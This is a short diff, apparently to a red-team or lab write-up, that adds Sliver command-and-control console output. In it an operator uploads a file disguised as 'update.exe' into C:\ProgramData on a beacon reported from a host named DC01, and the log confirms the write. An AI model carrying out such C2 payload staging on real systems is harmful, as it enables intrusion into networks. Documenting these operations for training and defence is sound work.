@@ -398,6 +398,12 @@ sliver (BLUSHING_ERROR) > upload /tmp/update.exe "C:\ProgramData\update.exe"
 
 [*] Tasked beacon BLUSHING_ERROR (00f0c14d)
 
+[*] Beacon 616ce2f6 BLUSHING_ERROR - 172.16.40.5:56665 (DC01) - windows/amd64 - Mon, 13 Jul 2026 15:10:34 CEST
+
+[+] BLUSHING_ERROR completed task 00f0c14d
+
+[*] Wrote file to C:\ProgramData\update.exe
+
 sliver (BLUSHING_ERROR) >
 
 ```
